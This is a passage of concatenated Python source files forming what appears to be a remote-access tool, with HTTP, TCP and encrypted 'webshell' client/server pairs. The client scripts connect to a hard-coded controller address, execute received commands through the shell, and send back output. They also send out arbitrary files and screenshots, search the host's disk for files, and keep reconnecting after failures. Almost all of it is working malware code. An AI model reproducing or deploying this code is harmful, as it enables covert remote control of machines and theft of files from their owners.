+            self.conn.send('DONE'.encode('ISO-8859-1', errors='ignore'))
+        else:
+            self.conn.send('File not found'.encode('ISO-8859-1', errors='ignore'))
+
+
+def main():
+    server = Server()
+
+
+if __name__ == '__main__':
+    main()
+File Name: Shell_client.py 
+##################################################################
+import random
+import subprocess
+import requests
+import time
+import os
+
+
+def main():
+    while True:
+        req = requests.get('http://10.0.0.16:8080')
+        command = req.text
+        if 'terminate' in command.lower():
+            break
+        elif 'grab' in command.lower() or 'download' in command.lower():
+            grab, path = command.split('*')
+            if os.path.isfile(path):
+                files = {'file': open(path, 'rb')}
+                requests.post('http://10.0.0.16:8080/store', files=files)
+            else:
+                requests.post('http://10.0.0.16:8080/store', data='[-] Not able to find the requested file!'.encode())
+        else:
+            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            requests.post('http://10.0.0.16:8080', data=CMD.stdout.read())
+            requests.post('http://10.0.0.16:8080', data=CMD.stderr.read())
+        time.sleep(3)
+
+
+if __name__ == '__main__':
+    while True:
+        try:
+            main()
+        except Exception:
+            sleep_for = random.randint(1, 10)
+            time.sleep(sleep_for)
+File Name: Shell_server.py 
+##################################################################
+import http.server
+import os, cgi
+
+HOST_NAME = '192.168.1.76'
+HOST_PORT = 8080
+
+
+class MyHandler(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        command = input('Shell< ')
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(command.encode())
+
+    def do_POST(self):
+        if self.path == '/store':
+            try:
+                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
+                if ctype == 'multipart/form-data':
+                    fs = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
+                    fs_up = fs['file']
+                    with open(r'C:\Users\ofeke\Desktop\Newfile.txt', 'wb') as o:
+                        print('[+] Writing file...')
+                        o.write(fs_up.file.read())
+                        print("Here")
+                        self.send_response(200)
+                        self.end_headers()
+                else:
+                    print('[-] Unexpected POST request.')
+            except Exception as e:
+                print(e)
+            return None
+        self.send_response(200)
+        self.end_headers()
+        length = int(self.headers['Content-length'])
+        postVar = self.rfile.read(length)
+        print(postVar.decode())
+
+
+def main():
+    server_class = http.server.HTTPServer
+    httpd = server_class((HOST_NAME, HOST_PORT), MyHandler)
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print("[!] Server is terminated.")
+        httpd.server_close()
+
+
+if __name__ == '__main__':
+    main()
+File Name: TCP_client.py 
+##################################################################
+import os
+import socket
+import subprocess
+from threading import Thread
+from helper_methods import *
+
+
+class Client(Thread):
+    def __init__(self, IP: str, Port: int):
+        self.conn = socket.socket()
+        self.IP = IP
+        self.Port = Port
+        print(f"Trying to connect to {self.IP} in port {self.Port}")
+        while True:
+            try:
+                self.conn.connect((IP, Port))
+                break
+            except Exception:
+                sleep_for = random.randrange(1, 10)
+                time.sleep(sleep_for)
+                continue
+        while True:
+            try:
+                AES_KEY = self.conn.recv(1024)
+                self.AES_KEY = AESFunc_client(AES_KEY).encode('ISO-8859-1', errors='ignore')
+                res = encrypt_client(os.getcwd().encode('ISO-8859-1', errors='ignore'), self.AES_KEY)
+                self.conn.send(res)
+                break
+            except Exception:
+                continue
+
+    def transfer(self, path):
+        if os.path.exists(path):
+            f = open(path, 'rb')
+            packet = f.read(1024)
+            while len(packet) > 0:
+                self.conn.send(packet)
+                packet = f.read(1024)
+            self.conn.send('DONE'.encode('ISO-8859-1', errors='ignore'))
+        else:
+            self.conn.send('File not found'.encode('ISO-8859-1', errors='ignore'))
+
+    def download(self, command):
+        f = open(command, 'wb')
+        while True:
+            bits = self.conn.recv(1024)
+            if bits.endswith('DONE'.encode('ISO-8859-1', errors='ignore')):
+                f.write(bits[:-4])
+                f.close()
+                print('[+] Transfer completed ')
+                break
+            if 'File not found'.encode('ISO-8859-1', errors='ignore') in bits:
+                print('[-] Unable to find out the file')
+                break
+            f.write(bits)
+
+    def run(self):
+        while True:
+            try:
+                command = decrypt_client(self.conn.recv(1024), self.AES_KEY)
+                print(command)
+            except ConnectionResetError:
+                self.__init__(self.IP, self.Port)
+                continue
+            if 'terminate' in command.decode('ISO-8859-1', errors='ignore'):
+                self.conn.close()
+                break
+            elif 'cd' in command.decode('ISO-8859-1', errors='ignore'):
+                command, path = command.decode('ISO-8859-1', errors='ignore')[0], list_to_path(
+                    command.decode('ISO-8859-1', errors='ignore').split(' ')[1:])
+                try:
+                    os.chdir(path)
+                    self.conn.send(
+                        encrypt_client(f'[+] CWD is {os.getcwd()}'.encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+                except Exception as e:
+                    self.conn.send(encrypt_client(('[-]' + str(e)).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+                    print("Could not enter this path.")
+            elif 'grab' in command.decode('ISO-8859-1', errors='ignore') or 'download' in command.decode('ISO-8859-1',
+                                                                                                         errors='ignore'):
+                grab, path = command.decode('ISO-8859-1', errors='ignore').split("*")
+                try:
+                    self.transfer(path)
+                except Exception:
+                    pass
+            elif 'upload' in command.decode('ISO-8859-1', errors='ignore') or 'send' in command.decode('ISO-8859-1',
+                                                                                                       errors='ignore'):
+                send, path = command.decode('ISO-8859-1', errors='ignore').split("*")
+                self.download(path)
+            elif 'screenshot' in command.decode('ISO-8859-1', errors='ignore'):
+                path = screenshot()
+                try:
+                    self.transfer(path)
+                except Exception as e:
+                    print(e)
+                    raise
+            elif 'searchd' in command.decode('ISO-8859-1', errors='ignore'):
+                path = command.decode()[8:]
+                lists = ''
+                for dir_path, dir_name, file_names in os.walk(path):
+                    for name in dir_name:
+                        lists += '\n' + os.path.abspath(name)
+                print(lists)
+                if lists == '':
+                    lists = 'No directories were found in the given path.'
+                length = len(lists)
+                self.conn.send(encrypt_client(str(length).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+                self.conn.send(encrypt_client(lists.encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+            elif 'searchf' in command.decode('ISO-8859-1', errors='ignore'):
+                command = command.decode('ISO-8859-1', errors='ignore')[8:]
+                path, file_name = command.split('*')  # searchf c:/*abc.pdf -> ['c:/', 'abc.pdf']
+                lists = ''
+                for dir_path, dir_name, file_names in os.walk(path):
+                    for file in file_names:
+                        if file == file_name:
+                            lists = '\n' + os.path.abspath(file)
+                print(lists)
+                if lists == '':
+                    lists = 'No match was found in the given path.'
+                length = len(lists)
+                self.conn.send(encrypt_client(str(length).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+                self.conn.send(encrypt_client(lists.encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+            elif 'search' in command.decode('ISO-8859-1', errors='ignore'):
+                command = command.decode('ISO-8859-1', errors='ignore')[7:]
+                path, ext = command.split('*')  # search c:/ *.pdf -> ['c:/', '.pdf']
+                lists = ''
+                for dir_path, dir_name, file_names in os.walk(path):
+                    for file in file_names:
+                        if file.endswith(ext):
+                            lists += '\n' + os.path.join(dir_path, file)
+                print(lists)
+                if lists == '':
+                    lists = 'No match was found in the given path.'
+                length = len(lists)
+                self.conn.send(encrypt_client(str(length).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+                self.conn.send(encrypt_client(lists.encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+            else:
+                try:
+                    output = subprocess.check_output(command.decode('ISO-8859-1', errors='ignore'), timeout=0.5,
+                                                     shell=True)
+                    print("Output: ", output)
+                    self.conn.send(encrypt_client(str(len(output)).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+                    self.conn.send(encrypt_client(output, self.AES_KEY))
+                except Exception as e:
+                    print(e)
+                    CMD = subprocess.Popen(command.decode('ISO-8859-1', errors='ignore'), shell=True,
+                                           stdout=subprocess.PIPE,
+                                           stderr=subprocess.PIPE
+                                           )
+                    print(CMD)
+                    self.conn.send(
+                        encrypt_client(
+                            str(len(encrypt_client(CMD.stdout.read() + CMD.stderr.read(), self.AES_KEY))).encode(
+                                'ISO-8859-1', errors='ignore'), self.AES_KEY))
+                    self.conn.send(encrypt_client(CMD.stdout.read() + CMD.stderr.read(), self.AES_KEY))
+
+
+def main():
+    client = Client("10.0.0.19", 9999)
+    client.run()
+
+
+main()
+File Name: TCP_server.py 
+##################################################################
+import os
+import socket
+from threading import Thread
+from pynput.keyboard import *
+from bin.helper_methods import *
+
+
+class Server(Thread):
+    def __init__(self):
+        self.controller = Controller()
+        self.conn = socket.socket()
+        self.conn.bind(("10.0.0.19", 9999))
+        self.conn.listen(1)
+        print('[+] Listening for income TCP connection on port 8080')
+        self.conn, addr = self.conn.accept()
+        print('[+]We got a connection from', addr)
+        self.conn.send(AESFunc_server(enc_key.encode('ISO-8859-1', errors='ignore')))
+        while True:
+            try:
+                self.cwd = decrypt_server(self.conn.recv(1024)).decode('ISO-8859-1', errors='ignore')
+                break
+            except Exception:
+                continue
+        self.commands = []
+        self.ind = 0
+        self.current_input = ''
+        th = Thread(target=self.key_event)
+        th.start()
+
+    def download(self, command):
+        self.conn.send(encrypt_server(command.encode('ISO-8859-1', errors='ignore')))
+        if command != 'screenshot':
+            _, path = command.split("*")
+        else:
+            path = os.path.abspath('screenshots') + time.asctime()[4:8] + time.asctime()[
+                                                                          8:10] + "-" + time.asctime()[
+                                                                                        20:] + "-" + time.asctime()[
+                                                                                                     11:19].replace(
+                ':', '-') + ".jpg"
+        f = open(path, 'wb')
+        while True:
+            bits = self.conn.recv(1024)
+            if bits.endswith('DONE'.encode('ISO-8859-1', errors='ignore')):
+                f.write(bits[:-4])
+                f.close()
+                print('[+] Transfer completed ')
+                break
+            if 'File not found'.encode('ISO-8859-1', errors='ignore') in bits:
+                print('[-] Unable to find the file')
+                break
+            f.write(bits)
+
+    def upload(self, command):
+        self.conn.send(encrypt_server(command.encode('ISO-8859-1', errors='ignore')))
+        send, command = command.split("*")
+        if os.path.isfile(command):
+            print(os.path.exists(command))
+            f = open(command, 'rb')
+            packet = f.read(1024)
+            while len(packet) > 0:
+                self.conn.send(packet)
+                packet = f.read(1024)
+            self.conn.send('DONE'.encode('ISO-8859-1', errors='ignore'))
+            print('[+] Transfer completed!')
+        else:
+            self.conn.send('File not found'.encode('ISO-8859-1', errors='ignore'))
+
+    def run(self):
+        while True:
+            command = input(self.cwd + ' ')
+            self.SaveObject(command)
+            print(command)
+            if 'cd' in command:
+                self.conn.send(encrypt_server(command.encode('ISO-8859-1')))
+                res = decrypt_server(self.conn.recv(1024)).decode('ISO-8859-1')
+                if '[+]' in res:
+                    self.cwd = res[11:]
+            elif 'terminate' in command:
+                self.conn.send(encrypt_server('terminate'.encode('ISO-8859-1')))
+                self.__init__()
+            elif 'grab' in command or 'download' in command:
+                self.download(command)
+            elif 'screenshot' == command:
+                self.download(command)
+            elif 'send' in command or 'upload' in command:
+                try:
+                    self.upload(command)
+                except Exception as e:
+                    print(e)
+            elif command == '':
+                continue
+            else:
+                try:
+                    self.conn.send(encrypt_server(command.encode('ISO-8859-1', errors='ignore')))
+                    length = int(decrypt_server(self.conn.recv(1024)).decode('ISO-8859-1', errors='ignore'))
+                    print(decrypt_server(self.conn.recv(16+length)).decode('ISO-8859-1', errors='ignore'))
+                except ValueError:
+                    continue
+                except (ConnectionResetError, ConnectionAbortedError):
+                    self.__init__()
+
+    def on_press(self, key):
+        if key == Key.up:
+            for i in range(len(self.current_input) + 10):
+                self.controller.press(Key.backspace)
+                self.controller.release(Key.backspace)
+            self.current_input = ''
+            for char in self.Back():
+                self.controller.press(char)
+                self.controller.release(char)
+                self.current_input += char
+        elif key == Key.down:
+            for i in range(len(self.current_input) + 10):
+                self.controller.press(Key.backspace)
+                self.controller.release(Key.backspace)
+            self.current_input = ''
+            for char in self.Forward():
+                self.controller.press(char)
+                self.controller.release(char)
+                self.current_input += char
+        elif key == Key.backspace:
+            self.current_input = self.current_input[:-1]
+        elif key == Key.enter:
+            self.current_input = ''
+        else:
+            try:
+                self.current_input += key.char
+            except Exception:
+                pass
+
+    def Back(self):
+        """Up arrow has been pressed"""
+        # self.commands: ['dir', 'ipconfig', 'cd ..']
+        ind = self.ind
+        try:
+            self.ind += 1
+            if self.ind > len(self.commands):
+                self.ind = 0
+            return self.commands[ind]
+        except IndexError:
+            return ''
+
+    def SaveObject(self, obj: ...):
+        """
+        Appends a command to the list
+        """
+        if obj in self.commands:  # If I pressed a command which I already executed bring it to the first place.
+            self.commands.remove(obj)
+            self.commands.insert(0, obj)
+        else:
+            self.commands.insert(0, obj)
+            self.ind = self.commands.index(obj)
+
+    def Forward(self) -> str:
+        """
+        Down arrow has been pressed.
+        """
+        try:
+            self.ind -= 1
+            ind = self.ind
+            return self.commands[ind]
+        except IndexError:
+            return ''
+
+    def key_event(self):
+        with Listener(on_press=self.on_press) as lis:
+            lis.join()
+
+
+def main():
+    server = Server()
+    server.run()
+
+
+main()
+File Name: Webshell_Client.py 
+##################################################################
+import os
+import socket
+import subprocess
+from threading import Thread
+from helper_methods import *
+
+
+class Client(Thread):
+    def __init__(self, IP: str, Port: int):
+        self.conn = socket.socket()
+        self.IP = IP
+        self.Port = Port
+        print(f"Trying to connect to {self.IP} in port {self.Port}")
+        while True:
+            try:
+                self.conn.connect((IP, Port))
+                break
+            except Exception:
+                sleep_for = random.randrange(1, 10)
+                time.sleep(sleep_for)
+                continue
+        while True:
+            try:
+                AES_KEY = self.conn.recv(1024)
+                self.AES_KEY = RSAFunc_client(AES_KEY).encode('ISO-8859-1', errors='ignore') # Receiving the AES key encrypted in RSA.
+                res = encrypt_client(os.getcwd().encode('ISO-8859-1', errors='ignore'), self.AES_KEY)
+                self.conn.send(res)
+                break
+            except Exception:
+                continue
+
+    def transfer(self, path):
+        if os.path.exists(path):
+            f = open(path, 'rb')
+            packet = f.read(1024)
+            while len(packet) > 0:
+                self.conn.send(packet)
+                packet = f.read(1024)
+            self.conn.send('DONE'.encode('ISO-8859-1', errors='ignore'))
+        else:
+            self.conn.send('File not found'.encode('ISO-8859-1', errors='ignore'))
+
+    def download(self, command):
+        f = open(command, 'wb')
+        while True:
+            bits = self.conn.recv(1024)
+            if bits.endswith('DONE'.encode('ISO-8859-1', errors='ignore')):
+                f.write(bits[:-4])
+                f.close()
+                print('[+] Transfer completed ')
+                break
+            if 'File not found'.encode('ISO-8859-1', errors='ignore') in bits:
+                print('[-] Unable to find out the file')
+                break
+            f.write(bits)
+
+    def run(self):
+        while True:
+            try:
+                command = decrypt_client(self.conn.recv(1024), self.AES_KEY)
+                print(command)
+            except ConnectionResetError:
+                self.__init__(self.IP, self.Port)
+                continue
+            if 'terminate' in command.decode('ISO-8859-1', errors='ignore'):
+                self.conn.close()
+                break
+            elif 'cd' in command.decode('ISO-8859-1', errors='ignore'):
+                command, path = command.decode('ISO-8859-1', errors='ignore')[0], list_to_path(
+                    command.decode('ISO-8859-1', errors='ignore').split(' ')[1:])
+                try:
+                    os.chdir(path)
+                    self.conn.send(
+                        encrypt_client(f'[+] CWD is {os.getcwd()}'.encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+                except Exception as e:
+                    self.conn.send(encrypt_client(('[-]' + str(e)).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+                    print("Could not enter this path.")
+            elif 'grab' in command.decode('ISO-8859-1', errors='ignore') or 'download' in command.decode('ISO-8859-1',
+                                                                                                         errors='ignore'):
+                grab, path = command.decode('ISO-8859-1', errors='ignore').split("*")
+                try:
+                    self.transfer(path)
+                except Exception:
+                    pass
+            elif 'upload' in command.decode('ISO-8859-1', errors='ignore') or 'send' in command.decode('ISO-8859-1',
+                                                                                                       errors='ignore'):
+                send, path = command.decode('ISO-8859-1', errors='ignore').split("*")
+                self.download(path)
+            elif 'screenshot' in command.decode('ISO-8859-1', errors='ignore'):
+                path = screenshot()
+                try:
+                    self.transfer(path)
+                except Exception as e:
+                    print(e)
+                    raise
+            elif 'searchd' in command.decode('ISO-8859-1', errors='ignore'):
+                path = command.decode()[8:]
+                lists = ''
+                for dir_path, dir_name, file_names in os.walk(path):
+                    for name in dir_name:
+                        lists += '\n' + os.path.abspath(name)
+                print(lists)
+                if lists == '':
+                    lists = 'No directories were found in the given path.'
+                length = len(lists)
+                self.conn.send(encrypt_client(str(length).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+                self.conn.send(encrypt_client(lists.encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+            elif 'searchf' in command.decode('ISO-8859-1', errors='ignore'):
+                command = command.decode('ISO-8859-1', errors='ignore')[8:]
+                path, file_name = command.split('*')  # searchf c:/*abc.pdf -> ['c:/', 'abc.pdf']
+                lists = ''
+                for dir_path, dir_name, file_names in os.walk(path):
+                    for file in file_names:
+                        if file == file_name:
+                            lists = '\n' + os.path.abspath(file)
+                print(lists)
+                if lists == '':
+                    lists = 'No match was found in the given path.'
+                length = len(lists)
+                self.conn.send(encrypt_client(str(length).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+                self.conn.send(encrypt_client(lists.encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+            elif 'search' in command.decode('ISO-8859-1', errors='ignore'):
+                command = command.decode('ISO-8859-1', errors='ignore')[7:]
+                path, ext = command.split('*')  # search c:/ *.pdf -> ['c:/', '.pdf']
+                lists = ''
+                for dir_path, dir_name, file_names in os.walk(path):
+                    for file in file_names:
+                        if file.endswith(ext):
+                            lists += '\n' + os.path.join(dir_path, file)
+                print(lists)
+                if lists == '':
+                    lists = 'No match was found in the given path.'
+                length = len(lists)
+                self.conn.send(encrypt_client(str(length).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+                self.conn.send(encrypt_client(lists.encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+            else:
+                try:
+                    output = subprocess.check_output(command.decode('ISO-8859-1', errors='ignore'), timeout=0.5,
+                                                     shell=True)
+                    print("Output: ", output)
+                    self.conn.send(encrypt_client(str(len(output)).encode('ISO-8859-1', errors='ignore'), self.AES_KEY))
+                    self.conn.send(encrypt_client(output, self.AES_KEY))
+                except Exception as e:
+                    print(e)
+                    CMD = subprocess.Popen(command.decode('ISO-8859-1', errors='ignore'), shell=True,
+                                           stdout=subprocess.PIPE,
+                                           stderr=subprocess.PIPE
+                                           )
+                    print(CMD)
+                    self.conn.send(
+                        encrypt_client(
+                            str(len(encrypt_client(CMD.stdout.read() + CMD.stderr.read(), self.AES_KEY))).encode(
+                                'ISO-8859-1', errors='ignore'), self.AES_KEY))
+                    self.conn.send(encrypt_client(CMD.stdout.read() + CMD.stderr.read(), self.AES_KEY))
+
+
+def main():
+    client = Client("10.0.0.18", 9999)
+    client.run()
+
+
+if __name__ == '__main__':
+    main()
+File Name: Webshell_Server.py 
+##################################################################
+import os
+import socket
+from threading import Thread
+from pynput.keyboard import *
+from bin.helper_methods import *
+
+
+class Server(Thread):
+    def __init__(self):
+        self.controller = Controller()
+        self.conn = socket.socket()
+        self.conn.bind((get_ip_address(), 9999))
+        self.conn.listen(100)
+        print('[+] Listening for income TCP connection on port 9999')
+        self.command = ''
+        self.commands = []
+        self.ind = 0
+        self.current_input = ''
+        self.cwd = os.path.abspath('.')
+        th = Thread(target=self.key_event)
+        th.start()
+
+    def connect(self):
+        self.conn, addr = self.conn.accept()
+        print('[+]We got a connection from', addr)
+        self.conn.send(RSAFunc_server(enc_key.encode('ISO-8859-1', errors='ignore'))) # Sending the AES key with RSA encryption
+        while True:
+            try:
+                self.cwd = decrypt_server(self.conn.recv(1024)).decode('ISO-8859-1', errors='ignore')
+                break
+            except Exception:
+                continue
+
+    def download(self, command):
+        self.conn.send(encrypt_server(command.encode('ISO-8859-1', errors='ignore')))
+        if command != 'screenshot':
+            _, path = command.split("*")
+        else:
+            path = os.path.abspath('screenshots') + time.asctime()[4:8] + time.asctime()[
+                                                                          8:10] + "-" + time.asctime()[
+                                                                                        20:] + "-" + time.asctime()[
+                                                                                                     11:19].replace(
+                ':', '-') + ".jpg"
+        f = open(path, 'wb')
+        while True:
+            bits = self.conn.recv(1024)
+            if bits.endswith('DONE'.encode('ISO-8859-1', errors='ignore')):
+                f.write(bits[:-4])
+                f.close()
+                return '[+] Transfer completed '
+            if 'File not found'.encode('ISO-8859-1', errors='ignore') in bits:
+                return '[-] Unable to find the file'
+            f.write(bits)
+
+    def upload(self, command):
+        self.conn.send(encrypt_server(command.encode('ISO-8859-1', errors='ignore')))
+        send, command = command.split("*")
+        if os.path.isfile(command):
+            print(os.path.exists(command))
+            f = open(command, 'rb')
+            packet = f.read(1024)
+            while len(packet) > 0:
+                self.conn.send(packet)
+                packet = f.read(1024)
+            self.conn.send('DONE'.encode('ISO-8859-1', errors='ignore'))
+            return '[+] Transfer completed!'
+        else:
+            self.conn.send('File not found'.encode('ISO-8859-1', errors='ignore'))
+            return 'File not found'
+
+    def execute(self):
+        self.SaveObject(self.command)
+        print(self.command)
+        if 'cd' in self.command:
+            self.conn.send(encrypt_server(self.command.encode('ISO-8859-1')))
+            res = decrypt_server(self.conn.recv(1024)).decode('ISO-8859-1')
+            if '[+]' in res:
+                self.cwd = res[11:]
+            return res
+        elif 'terminate' in self.command:
+            self.conn.send(encrypt_server('terminate'.encode('ISO-8859-1')))
+            self.connect()
+        elif 'grab' in self.command or 'download' in self.command:
+            self.download(self.command)
+        elif 'screenshot' == self.command:
+            self.download(self.command)
+        elif 'send' in self.command or 'upload' in self.command:
+            try:
+                self.upload(self.command)
+            except Exception as e:
+                return e
+        elif self.command == '':
+            return ''
+        else:
+            try:
+                self.conn.send(encrypt_server(self.command.encode('ISO-8859-1', errors='ignore')))
+                length = int(decrypt_server(self.conn.recv(1024)).decode('ISO-8859-1', errors='ignore'))
+                return decrypt_server(self.conn.recv(16 + length)).decode('ISO-8859-1', errors='ignore')
+            except ValueError:
+                return 'Value Error'
+            except (ConnectionResetError, ConnectionAbortedError):
+                self.connect()
+
+    def on_press(self, key):
+        if key == Key.up:
+            for i in range(len(self.current_input)):
+                self.controller.press(Key.backspace)
+                self.controller.release(Key.backspace)
+            self.current_input = ''
+            for char in self.Back():
+                self.controller.press(char)
+                self.controller.release(char)
+                self.current_input += char
+        elif key == Key.down:
+            for i in range(len(self.current_input)):
+                self.controller.press(Key.backspace)
+                self.controller.release(Key.backspace)
+            self.current_input = ''
+            for char in self.Forward():
+                self.controller.press(char)
+                self.controller.release(char)
+                self.current_input += char
+        elif key == Key.backspace:
+            self.current_input = self.current_input[:-1]
+        elif key == Key.enter:
+            self.current_input = ''
+        else:
+            try:
+                self.current_input += key.char
+            except Exception:
+                pass
+
+    def Back(self):
+        """Up arrow has been pressed"""
+        # self.commands: ['dir', 'ipconfig', 'cd ..']
+        ind = self.ind
+        try:
+            self.ind += 1
+            if self.ind > len(self.commands):
+                self.ind = 0
+            return self.commands[ind]
+        except IndexError:
+            return ''
+
+    def SaveObject(self, obj: ...):
+        """
+        Appends a command to the list
+        """
+        if obj in self.commands:  # If I pressed a command which I already executed bring it to the first place.
+            self.commands.remove(obj)
+            self.commands.insert(0, obj)
+        else:
+            self.commands.insert(0, obj)
+            self.ind = self.commands.index(obj)
+
+    def Forward(self) -> str:
+        """
+        Down arrow has been pressed.
+        """
+        try:
+            self.ind -= 1
+            ind = self.ind
+            return self.commands[ind]
+        except IndexError:
+            return ''
+
+    def key_event(self):
+        with Listener(on_press=self.on_press) as lis:
+            lis.join()
+
+
+def main():
+    server = Server()
+
+
+if __name__ == '__main__':
+    main()
+File Name: test.py 
+##################################################################
